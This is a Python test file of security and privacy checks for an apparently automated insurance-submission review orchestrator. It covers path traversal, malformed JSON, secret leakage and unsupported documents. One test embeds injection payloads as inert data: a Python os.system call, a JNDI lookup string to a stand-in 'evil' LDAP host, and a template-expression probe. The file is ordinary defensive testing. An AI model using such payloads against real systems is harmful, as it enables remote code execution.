"""Security and privacy tests (spec section 16)."""
from __future__ import annotations

import json
from pathlib import Path

from app.agents import Orchestrator
from app.config import Settings
from app.schemas.review import ReviewRequest
from tests.conftest import ROOT


def test_path_traversal_rejected(settings, repository):
    orchestrator = Orchestrator(settings=settings, repository=repository)
    result = orchestrator.run_review(ReviewRequest(
        submission_id="T-SEC",
        documents=[{"path": "C:/Windows/System32/drivers/etc/hosts"}],
        line_of_business="package"))
    assert result.status.value == "ERROR/INCOMPLETE"
    assert any("outside allowed workspace" in e for e in result.errors)


def test_malformed_json_visible_not_silent(settings, repository):
    bad_dir = ROOT / "data" / "test-tmp" / "malformed"
    bad_dir.mkdir(parents=True, exist_ok=True)
    (bad_dir / "broken.json").write_text("{not valid", encoding="utf-8")
    orchestrator = Orchestrator(settings=settings, repository=repository)
    result = orchestrator.run_review(ReviewRequest(
        submission_id="T-SEC2", input_dir=str(bad_dir), line_of_business="package"))
    assert result.status.value == "ERROR/INCOMPLETE"
    assert any("Invalid JSON" in e for e in result.errors)


def test_no_secrets_in_exports_or_errors(settings, repository, review_runner):
    settings.openai_api_key = "sk-should-never-appear-999"
    result = review_runner("a01", "SPX-A01-2026-0101")
    payload = result.model_dump_json()
    assert "sk-should-never-appear-999" not in payload
    for e in result.errors:
        assert "sk-" not in e


def test_env_example_has_no_real_secrets():
    text = (ROOT / ".env.example").read_text(encoding="utf-8")
    assert "OPENAI_API_KEY=" in text
    assert "sk-" not in text


def test_untrusted_json_strings_never_executed(settings, repository):
    payload = {
        "submission_id": "T-SEC3",
        "document": {"document_id": "X1", "document_type": "broker_email"},
        "data": {"subject": "__import__('os').system('echo pwned')",
                 "body": "${jndi:ldap://evil} {{7*7}}"},
    }
    orchestrator = Orchestrator(settings=settings, repository=repository)
    result = orchestrator.run_review(ReviewRequest(
        submission_id="T-SEC3", documents=[{"content": payload}],
        line_of_business="package", deterministic_only=True))
    # Run completes without the payloads being executed or interpolated.
    assert result.status.value in {"PASS", "REVIEW", "HOLD", "ERROR/INCOMPLETE"}
    # The strings survive verbatim as inert evidence data.
    from tests.conftest import make_case
    case = make_case([payload])
    narrative_ev = next(e for e in case.evidence_store.values()
                        if "jndi" in str(e.raw_value))
    assert narrative_ev.raw_value == payload["data"]["body"]


def test_unsupported_document_preserved_not_dropped(repository, tmp_path):
    case_dir = ROOT / "data" / "test-tmp" / "weird"
    case_dir.mkdir(parents=True, exist_ok=True)
    (case_dir / "mystery.json").write_text(json.dumps({
        "submission_id": "T-SEC4",
        "document": {"document_id": "M1", "document_type": "satellite_imagery"},
        "data": {"note": "unsupported type"},
    }), encoding="utf-8")
    orchestrator_settings = Settings(
        _env_file=None,
        spectra_ruleset_dir=ROOT / "rulesets",
        spectra_profile_dir=ROOT / "profiles",
        database_url=f"sqlite:///{tmp_path}/t.db")
    orchestrator = Orchestrator(settings=orchestrator_settings, repository=repository)
    result = orchestrator.run_review(ReviewRequest(
        submission_id="T-SEC4", input_dir=str(case_dir), line_of_business="package",
        review_date="2026-10-28", deterministic_only=True))
    assert not any(f.finding_type == "UNSUPPORTED_DOCUMENT_TYPE" for f in result.findings)
    unsupported = next(
        check for check in result.checks
        if check.check_id == "UNSUPPORTED-DOCUMENT-TYPES")
    assert unsupported.status.value == "INCOMPLETE"
    assert "satellite_imagery" in unsupported.detail
